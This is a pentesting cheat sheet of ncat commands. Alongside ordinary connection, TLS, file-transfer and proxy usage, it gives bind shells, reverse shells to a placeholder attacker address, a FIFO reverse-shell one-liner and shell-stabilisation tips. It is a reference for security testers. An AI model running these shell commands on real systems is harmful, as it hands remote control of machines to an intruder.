# Ncat Cheat Sheet (Pentesting Essentials)

## 📡 Basic Connections

### Connect to a target (TCP client)
ncat <ip> <port>

Example:
ncat 10.10.10.10 80

### Connect with UDP
ncat -u <ip> <port>

---

## 🎧 Listening (Bind Shells)

### Listen on a port
ncat -l <port>

### Listen verbosely
ncat -lvnp <port>

### Listen and execute a shell (Linux)
ncat -lvnp <port> -e /bin/bash

### Windows shell
ncat -lvnp <port> -e cmd.exe

---

## 🔁 Reverse Shells

### Linux reverse shell
ncat <attacker_ip> <port> -e /bin/bash

### Windows reverse shell
ncat <attacker_ip> <port> -e cmd.exe

NOTE: `-e` may be disabled in some builds.

---

## 🔄 Reverse Shell (No -e workaround)

### Using FIFO (Linux)
mkfifo /tmp/f; ncat <ip> <port> < /tmp/f | /bin/sh > /tmp/f 2>&1

---

## 🔐 Encrypted Connections (SSL/TLS)

### Connect over SSL
ncat --ssl <ip> <port>

### Listen with SSL
ncat -lvnp <port> --ssl

---

## 🔄 File Transfer

### Send file
ncat -lvnp <port> < file.txt

### Receive file
ncat <ip> <port> > file.txt

---

## 🔍 Port Scanning (basic)

ncat -zv <ip> 1-1000

---

## 🔗 Pivoting / Relays

### Simple relay (port forward)
ncat -l <port> --sh-exec "ncat <target_ip> <target_port>"

---

## 🌐 Proxy Usage

### SOCKS5 proxy
ncat --proxy <proxy_ip:port> --proxy-type socks5 <target> <port>

### HTTP proxy
ncat --proxy <proxy_ip:port> --proxy-type http <target> <port>

---

## 📢 Chat / Multi-user server

ncat -lvnp <port> --chat

---

## ⚙️ Useful Flags

- -l → Listen mode  
- -v → Verbose  
- -n → No DNS resolution  
- -p → Specify port  
- -e → Execute command  
- -c → Execute via shell  
- -u → UDP mode  
- -z → Zero-I/O (scan mode)  
- --ssl → Enable TLS  
- --chat → Chat server  
- --keep-open → Multiple connections  
- --allow → Allow only specific IP  
- --deny → Block IP  

---

## ⚡ Shell Upgrade Tips

### Spawn TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

### Fix terminal
export TERM=xterm

### Stabilize shell
CTRL+Z
stty raw -echo; fg
